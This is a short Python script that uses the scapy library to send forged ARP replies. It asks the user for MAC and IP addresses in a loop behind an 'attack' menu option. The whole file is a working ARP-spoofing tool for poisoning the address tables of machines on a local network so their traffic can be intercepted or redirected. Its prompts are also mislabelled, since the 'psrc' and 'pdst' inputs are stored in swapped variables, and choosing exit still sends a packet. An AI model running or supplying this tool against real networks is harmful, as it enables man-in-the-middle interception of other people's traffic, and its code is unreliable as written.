from scapy . all import *

SPOOF =  True

while SPOOF:
    sel = input("1.attack 2.exit")

    if sel == '2':
        SPOOF = False

    destination = input("dst: ")
    source = input("src: ")
    dstIP = input("psrc: ") 
    srcIP = input("pdst: ")

    p = Ether (dst = destination, src = source) / ARP (op = 2, hwsrc = source, psrc = srcIP, hwdst = destination, pdst = dstIP)
    sendp (p)
